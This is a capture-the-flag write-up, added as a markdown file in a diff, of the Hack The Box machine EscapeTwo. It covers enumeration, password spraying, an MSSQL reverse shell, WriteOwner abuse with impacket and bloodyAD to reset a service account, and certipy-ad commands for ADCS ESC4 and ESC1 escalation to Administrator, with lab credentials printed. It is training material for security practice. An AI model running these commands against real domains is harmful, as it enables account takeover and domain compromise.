@@ -1,0 +1,287 @@
+---
+title: HTB-EscapeTwo
+published: 2026-01-23
+toc: true
+draft: false
+tags:
+  - ADCS
+  - BloodyAD
+  - netexec
+  - MSSQL
+  - ESC4
+  - ESC1
+  - WriteOwner
+---
+
+```
+Scope:
+10.129.232.128
+
+Creds:
+rose
+KxEPkKe6R8su
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv escapetwo.htb
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-23 18:32:32Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-23T18:34:02+00:00; -13s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-23T18:34:02+00:00; -13s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49693/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49710/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49726/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+## Enum4linux-ng
+
+Using the `enum4linux-ng` tool I was able to enumerate the following information:
+
+![](attachments/a2bd4077bb395761a14b1235c6cc947e.png)
+
+Scrolling further down I found all the users present on the system:
+
+![](attachments/819cb0abcf83db235f91cd1cc87e112f.png)
+
+I was also able to read through some shares on the system:
+
+![](attachments/29e423b9db33d5f1a9cf665037907966.png)
+
+Luckily for me (as usually in CTF's) there's no password lockout set to prevent password spraying:
+
+![](attachments/3022b8d4f1a3901778f4a562c44db5f5.png)
+
+## nxc
+
+Continuing on I ran `nxc` and found some kerberoastable users:
+
+![](attachments/c8b1c69e430c2718acf6a65884c936b2.png)
+
+```
+ca_svc
+sql_svc
+```
+
+Unfortunately I was unable to crack these:
+
+![](attachments/ea6d2dc8269edb68e7ee2f1a307de940.png)
+
+## smbclient
+
+Using `smbclient` I went ahead and logged into some of the shares to enumerate those further:
+
+![](attachments/6055cd356360029e07851103d90df56c.png)
+
+I downloaded the present files and checked them out.
+
+These appeared to be corrupted however:
+
+![](attachments/6694b995df0b2494948f8453ae0017ed.png)
+
+### hexdump
+
+By running `hexdump` I noticed that the first magic bytes is the following:
+
+![](attachments/4b4303d18d686f82aadc4b17f3cbc9d7.png)
+
+If we are to believe this AI overview this points to an archive file instead of a `xlsx` file.
+
+![](attachments/ec7c0afb9285109417ada780d51bc7f3.png)
+
+### hexeditor
+
+It appears the magic bytes got corrupted and should be fixed:
+
+![](attachments/d90ae07ea42e4377bce48949dba9f9bc.png)
+
+![](attachments/b735d6a7bd5c9cdc4726b299cc807e4c.png)
+
+After editing the file it shows up correctly:
+
+![](attachments/c54c7d7d1ba07fe85bcb292251de0ac2.png)
+
+Now that the bytes have been fixed we can view the contents of the file:
+
+![](attachments/e0cb9821580a33dca978d0fdcdc855a5.png)
+
+By using password spraying methods we can get the following valid info:
+
+![](attachments/65494676d9a983d646ab396e8af64b37.png)
+
+## MSSQL
+
+But more importantly:
+
+![](attachments/0034c2467920a7557742859a6f081c9d.png)
+
+![](attachments/8063c14f7b7564014286593a686bca16.png)
+
+# Foothold
+## Shell as sql_svc
+
+Using these rights we can give ourselves a reverse shell:
+
+![](attachments/ccb3291f77520727a2def8b71d28457b.png)
+
+![](attachments/ec3d335e981f3dac509818d5fcf1792e.png)
+
+From here I enumerated the local users:
+
+![](attachments/a8cfecd4c664fb2f51d22fedf4eed7b1.png)
+
+Nothing interesting there, so I checked out the `C:\` directory:
+
+![](attachments/9db33669d67b95b54b773b1492b86cbe.png)
+
+![](attachments/3de423ece1a8d8107d51c95618c9f63e.png)
+
+Inside we find another password that we hadn't found yet:
+
+![](attachments/6a23ce8ed6d85ea44608b364d983c497.png)
+
+However when spraying the passwords I discovered that the *ryan* user also used this password:
+
+![](attachments/ed27056b8bc250ce0762c6cfb2e4ce60.png)
+
+## BloodHound
+
+I continued enumeration using `bloodhound`:
+
+![](attachments/a40fd6674f2d5a902dc41d495190ae58.png)
+
+![](attachments/181fdf5b5ccc0a854e99bf97bd7bf466.png)
+
+### WriteOwner
+
+Here I noticed that *ryan* has the `WriteOwner` rights over the *ca_svc* user which can be exploited as follows:
+
+```bash
+impacket-owneredit -action write -new-owner ryan -target-dn "CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB" sequel.htb/ryan:'WqSZAF6CysDQbGb3'
+```
+
+![](attachments/ced42497f913076d7697d0affd11ad51.png)
+
+Alternatively this can also be done using `bloodyAD`:
+
+```bash
+bloodyAD --host 10.129.232.128  -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
+```
+
+![](attachments/4ed06a4ec392bc81c2ebbce39599a65e.png)
+
+Accordingly we can force change the password for the *ca_svc* service account. This can yet again be done in multiple ways as seen below:
+
+- Using `impacket` tool suite
+
+```bash
+impacket-dacledit -action write -rights FullControl -principal ryan -target-dn "CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB" sequel.htb/ryan:'WqSZAF6CysDQbGb3'
+```
+
+![](attachments/498ec0653aeaccea8d605329e176aecf.png)
+
+- Using `bloodyAD`
+
+```bash
+bloodyAD --host 10.129.232.128  -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set password ca_svc 'P@ssword123!'
+```
+
+![](attachments/51a89ff14f634eeb4cfde815f7c198a2.png)
+
+# Privilege Escalation
+## ADCS - ESC4
+
+Since the service account is a specific Certification Authority account I checked out whether any ADCS vulns were present using `certipy-ad`:
+
+![](attachments/957d12111f6c5f9ef0b72fdd1344dcc8.png)
+
+![](attachments/dc14149760adce02ad9893c95efeee08.png)
+
+It turns out that the system is vulnerable to **ESC4** where the specific template name is the following:
+
+![](attachments/f4c3cda871c3bc6afdbc03d69da00a37.png)
+
+Accordingly we will be issuing the following:
+
+```bash
+certipy-ad template -u ca_svc@sequel.htb -p 'P@ssword123!' -template "DunderMifflinAuthentication" -dc-ip 10.129.232.128 -write-default-configuration
+```
+
+![](attachments/4276553446d49a69bc007e59df8c20b1.png)
+
+## ADCS - ESC1
+
+Now that configuration is reverted to default **ESC1** is now possible to exploit:
+
+![](attachments/7c707bb4fee8dcf36391c20287190098.png)
+
+This can be done as follows:
+
+```bash
+certipy-ad req -username ca_svc@sequel.htb -p 'P@ssword123!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -dc-ip 10.129.232.128 -upn Administrator@sequel.htb -sid 'S-1-5-21-548670397-972687484-3496335370-500'
+```
+
+![](attachments/704726dae5d1b5caed6b3758acabc94f.png)
+
+From here I was able to change the password and log in as the *Administrator*:
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128 -ldap-shell
+```
+
+![](attachments/fd3690886c9b1d6fd10f6d9adf826b9a.png)
+
+## Shell as Administrator
+
+![](attachments/39d6bd400d76edc940cb29638da3a127.png)
+
+### user.txt
+
+![](attachments/bcc2b121f938234dee07d1e9c40d252b.png)
+
+### root.txt
+
+![](attachments/a5d8dc7ac977601f014b9a1538c1c8dc.png)
+
+![](attachments/02cd50612651cae27bda0ec131974bb0.png)
+
+---
